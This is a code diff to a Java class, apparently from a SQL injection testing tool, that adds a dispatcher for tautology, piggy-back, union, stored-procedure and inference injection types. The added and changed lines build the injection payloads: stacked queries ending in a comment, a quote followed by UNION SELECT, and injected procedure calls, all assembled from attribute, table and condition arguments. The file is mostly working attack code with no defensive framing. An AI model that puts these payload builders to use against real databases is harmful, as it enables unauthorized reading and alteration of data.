@@ -27,15 +27,64 @@ public class BobRoss {
 		return attack;
 	}
 	
+	public String attack_second_order(String base, String args[], String subtype){
+		String attack = base;
+		
+		switch(subtype){
+			case "tautology":
+				if (args.length != 0){
+					CP.println("Invalid Arguments Passed for type: "+subtype);
+					CP.println(subtype+":: NONE");
+					return null;
+				}
+				return attack_hot_tautic(base);
+				
+			case "piggy-back":
+				if (args.length != 3){
+					CP.println("Error:: Invalid Arguments Passed"+subtype);
+					CP.println(subtype+":: attribute, table, equality");
+					return null;
+				}
+				return attack_piggy_bois(base, args[0], args[1], args[2]);
+				
+			case "union":
+				if (args.length != 3){
+					CP.println("Error:: Invalid Arguments Passed"+subtype);
+					CP.println(subtype+":: attribute, table, equality");
+					return null;
+				}
+				return attack_union_jack(base, args[0], args[1], args[2]);
+				
+			case "procedure":
+				if (args.length != 1){
+					CP.println("Error:: Invalid Arguments Passed"+subtype);
+					CP.println(subtype+":: procedure");
+					return null;
+				}
+				return attack_fatty_fatty_boombalady(base, args[0]);
+				
+			case "inference":
+				if (args.length != 2){
+					CP.println("Error:: Invalid Arguments Passed"+subtype);
+					CP.println(subtype+":: legal_input, string_bool");
+					return null;
+				}
+				return attack_achktually(base, args[0], (args[1] == "true")? true : (args[1] == "false")? false : null);
+				
+		}
+		//attack += "';" +" SELECT "+attribute+" FROM "+table+" WHERE "+equality+" --";
+		return attack;
+	}
+	
 	/** Piggybacked query style attack
 	 * @param base:  Base input because server's prefer inputs to not be empty
 	 * @param query: User defined query they are trying to run
 	 * @return the constructed attack
 	 */
-	public String attack_piggy_bois(String base, String query){
+	public String attack_piggy_bois(String base, String attribute, String table, String equality){
 		String attack = base;
 		
-		attack += "';" +query+" --";
+		attack += "';" +" SELECT "+attribute+" FROM "+table+" WHERE "+equality+" --";
 		return attack;
 	}
 	
@@ -51,7 +100,7 @@ public class BobRoss {
 	public String attack_union_jack(String base, String attribute, String table, String equality){
 		String attack = base;
 		
-		attack += "’ UNION SELECT "+attribute+" from "+table+" where "+equality+" --";
+		attack += "’ UNION SELECT "+attribute+" FROM "+table+" WHERE "+equality+" --";
 		return attack;
 	}
 	
@@ -64,7 +113,7 @@ public class BobRoss {
 	public String attack_fatty_fatty_boombalady(String base, String procedure){
 		String attack = base;
 		
-		attack += "’ ;"+procedure+"; --";
+		attack += "’ ; "+procedure+"; --";
 		return attack;
 	}
 	
